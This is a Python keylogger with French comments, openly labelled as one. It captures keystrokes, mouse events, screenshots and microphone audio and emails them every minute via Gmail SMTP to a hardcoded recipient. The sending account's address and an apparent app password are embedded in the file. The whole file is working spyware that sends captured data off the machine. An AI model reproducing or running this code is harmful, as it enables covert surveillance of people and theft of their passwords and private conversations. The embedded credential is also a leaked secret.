import smtplib
import threading
import wave
import pyscreenshot as ImageGrab
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener as ClavierListener
from pynput.mouse import Listener as SourisListener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configuration des informations d'adresse e-mail
ADRESSE_EMAIL = "klogger810@gmail.com"  # Adresse e-mail utilisée pour envoyer les rapports
MOT_DE_PASSE_EMAIL = "ldmj xpqq bahe lhvn"  # Mot de passe de l'adresse e-mail
INTERVALLE_RAPPORT = 60  # Intervalle entre les rapports, en secondes

# Classe KeyLogger
class Journalisation:
    def __init__(self, intervalle_temps, email, mot_de_passe):
        self.intervalle = intervalle_temps  # Intervalle entre les envois de rapport
        self.journal = "Journalisation démarrée...\n"  # Chaîne de journalisation initiale
        self.email = email  # Adresse e-mail pour l'envoi des rapports
        self.mot_de_passe = mot_de_passe  # Mot de passe de l'adresse e-mail
        self.listener_clavier = None  # Listener pour le clavier
        self.listener_souris = None  # Listener pour la souris
        self.thread_microphone = None  # Thread pour l'enregistrement audio
        self.thread_capture = None  # Thread pour les captures d'écran
        self.en_cours = False  # État de la journalisation

    # Méthode pour ajouter des entrées au journal
    def ajouter_journal(self, chaine):
        self.journal += chaine  # Ajoute une chaîne au journal

    # Méthode pour envoyer un email avec le journal ou une pièce jointe
    def envoyer_email(self, email, mot_de_passe, message, fichier=None):
        expéditeur = ADRESSE_EMAIL  # Adresse e-mail de l'expéditeur
        destinataire = "loggerkey285@gmail.com"  # Adresse e-mail du destinataire
        
        # Création de l'objet email
        msg = MIMEMultipart()
        msg['From'] = expéditeur
        msg['To'] = destinataire
        msg['Subject'] = "Rapport de Keylogger"  # Sujet de l'email

        # Corps de l'email
        corps = f"Keylogger par Boulakhlas Yoan\n\n{message}"
        msg.attach(MIMEText(corps, 'plain'))

        # Ajout de la pièce jointe, le cas échéant
        if fichier:
            with open(fichier, 'rb') as pièce_jointe:
                partie = MIMEBase('application', 'octet-stream')
                partie.set_payload(pièce_jointe.read())
            encoders.encode_base64(partie)
            partie.add_header('Content-Disposition', f'attachment; filename= {fichier}')
            msg.attach(partie)
        
        # Envoi de l'email
        try:
            serveur = smtplib.SMTP('smtp.gmail.com', 587)
            serveur.starttls()
            serveur.login(expéditeur, mot_de_passe)
            texte = msg.as_string()
            serveur.sendmail(expéditeur, destinataire, texte)
            serveur.quit()
            print("Email envoyé avec succès")
        except Exception as e:
            self.ajouter_journal(f"Échec de l'envoi de l'email : {str(e)}\n")

    # Méthode pour démarrer la journalisation
    def démarrer(self):
        self.en_cours = True  # Démarre la journalisation
        self.listener_clavier = ClavierListener(on_press=self.sur_appui_clavier)  # Initialise le listener clavier
        self.listener_souris = SourisListener(on_move=self.sur_mouvement_souris, on_click=self.sur_clic_souris, on_scroll=self.sur_défilement_souris)  # Initialise le listener souris
        self.thread_microphone = threading.Thread(target=self.microphone)  # Initialise le thread pour l'enregistrement audio
        self.thread_capture = threading.Thread(target=self.capture_écran)  # Initialise le thread pour les captures d'écran

        self.listener_clavier.start()  # Démarre le listener clavier
        self.listener_souris.start()  # Démarre le listener souris
        self.thread_microphone.start()  # Démarre le thread pour l'enregistrement audio
        self.thread_capture.start()  # Démarre le thread pour les captures d'écran

        self.rapport()  # Démarre le cycle de rapports
        print("Journalisation démarrée...")

    # Méthode pour arrêter la journalisation
    def arrêter(self):
        self.en_cours = False  # Arrête la journalisation
        if self.listener_clavier:
            self.listener_clavier.stop()
            self.listener_clavier.join()  # Arrête et attend la fin du listener clavier
        if self.listener_souris:
            self.listener_souris.stop()
            self.listener_souris.join()  # Arrête et attend la fin du listener souris
        if self.thread_microphone:
            self.thread_microphone.join()  # Attend la fin du thread d'enregistrement audio
        if self.thread_capture:
            self.thread_capture.join()  # Attend la fin du thread de capture d'écran
        print("Journalisation arrêtée.")

    # Méthode pour envoyer le rapport périodiquement
    def rapport(self):
        self.envoyer_email(self.email, self.mot_de_passe, self.journal)  # Envoie le journal par email
        self.journal = ""  # Réinitialise le journal après envoi
        if self.en_cours:
            threading.Timer(self.intervalle, self.rapport).start()  # Redémarre le timer pour le prochain rapport

    # Méthode pour enregistrer les touches frappées
    def sur_appui_clavier(self, touche):
        try:
            touche_actuelle = touche.char  # Obtient le caractère de la touche
        except AttributeError:
            if touche == keyboard.Key.space:
                touche_actuelle = "ESPACE"
            elif touche == keyboard.Key.esc:
                touche_actuelle = "ECHAP"
            else:
                touche_actuelle = f" {touche} "  # Pour les touches spéciales
        self.ajouter_journal(touche_actuelle + "\n")  # Ajoute la touche au journal
        print(f"Touche appuyée : {touche_actuelle}")

    # Méthode pour enregistrer les mouvements de souris
    def sur_mouvement_souris(self, x, y):
        self.ajouter_journal(f"Souris déplacée vers ({x}, {y})\n")  # Ajoute les coordonnées du mouvement au journal
        print(f"Souris déplacée vers ({x}, {y})\n")

    # Méthode pour enregistrer les clics de souris
    def sur_clic_souris(self, x, y, bouton, appuyé):
        action = "Appuyé" if appuyé else "Relâché"  # Détermine si le bouton est appuyé ou relâché
        self.ajouter_journal(f"Souris {action} à ({x}, {y}) avec {bouton}\n")  # Ajoute l'action de clic au journal

    # Méthode pour enregistrer les défilements de souris
    def sur_défilement_souris(self, x, y, dx, dy):
        self.ajouter_journal(f"Souris défilée à ({x}, {y}) ({dx}, {dy})\n")  # Ajoute les coordonnées de défilement au journal

    # Méthode pour enregistrer des sons via le microphone
    def microphone(self):
        fs = 44100  # Fréquence d'échantillonnage
        secondes = INTERVALLE_RAPPORT  # Durée de l'enregistrement
        try:
            obj = wave.open('son.wav', 'w')  # Crée un fichier audio
            obj.setnchannels(1)  # Mode mono
            obj.setsampwidth(2)  # Taille de l'échantillon
            obj.setframerate(fs)  # Fréquence d'échantillonnage
            enregistrement = sd.rec(int(secondes * fs), samplerate=fs, channels=2)  # Enregistre le son
            sd.wait()  # Attend la fin de l'enregistrement
            obj.writeframesraw(enregistrement)  # Écrit les frames dans le fichier audio
            obj.close()  # Ferme le fichier audio
            self.envoyer_email(email=ADRESSE_EMAIL, mot_de_passe=MOT_DE_PASSE_EMAIL, message="Enregistrement", fichier="son.wav")  # Envoie le fichier audio par email
        except Exception as e:
            self.ajouter_journal(f"Erreur d'enregistrement du microphone : {str(e)}\n")  # Ajoute une erreur au journal en cas d'échec

    # Méthode pour prendre une capture d'écran
    def capture_écran(self):
        try:
            img = ImageGrab.grab()  # Prend une capture d'écran
            img.save("capture.png")  # Sauvegarde la capture d'écran
            self.envoyer_email(email=ADRESSE_EMAIL, mot_de_passe=MOT_DE_PASSE_EMAIL, message="Capture d'écran", fichier="capture.png")  # Envoie la capture d'écran par email
        except Exception as e:
            self.ajouter_journal(f"Erreur lors de la capture d'écran : {str(e)}\n")  # Ajoute une erreur au journal en cas d'échec

# Bloc principal du programme
if __name__ == "__main__":
    keylogger = Journalisation(INTERVALLE_RAPPORT, ADRESSE_EMAIL, MOT_DE_PASSE_EMAIL)  # Crée une instance de Journalisation
    keylogger.démarrer()  # Démarre la journalisation

    try:
        threading.Event().wait()  # Attend indéfiniment jusqu'à ce que le programme soit arrêté
    except KeyboardInterrupt:
        keylogger.arrêter()  # Arrête la journalisation en cas d'interruption clavier
        print("Programme terminé manuellement.")
